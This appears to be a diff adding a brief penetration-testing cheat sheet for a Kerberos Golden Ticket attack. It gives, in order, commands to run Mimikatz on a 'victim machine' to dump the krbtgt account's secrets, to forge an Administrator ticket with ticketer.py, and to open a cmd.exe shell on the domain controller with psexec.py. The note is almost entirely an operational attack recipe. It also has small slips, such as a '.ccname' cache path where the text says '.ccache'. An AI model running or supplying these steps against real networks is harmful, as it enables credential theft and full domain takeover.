@@ -1,0 +1,24 @@
+# Mimikatz
+
+Upload Mimikatz to the victim machine and then execute this command
+
+  lsadump::lsa /inject /name:krbtgt
+
+We need to dump this user’s information in order to create a Golden Ticket.
+
+All the information it returns should be saved into a file, since we’re going to use it with the ticketer
+
+# Ticketer.py
+
+Once you have dumped the user’s information into a file on our local machine, we’re going to execute this script as follows
+
+  ticketer.py -nthash nt -domain-sid sid -domain dominio Administrator
+
+This will generate some files, and we need to create an environment variable called KRB5CCNAME, which should be the absolute path to the .ccache file that has been generated.
+
+  export KRB5CCNAME="/route/archive/Administrador.ccname"
+
+Now we can connect to the DC without any issues, since the system is using a Kerberos credential cache.
+
+  python3 psexec.py -n -k domain/Administrator@DC cmd.exe
+
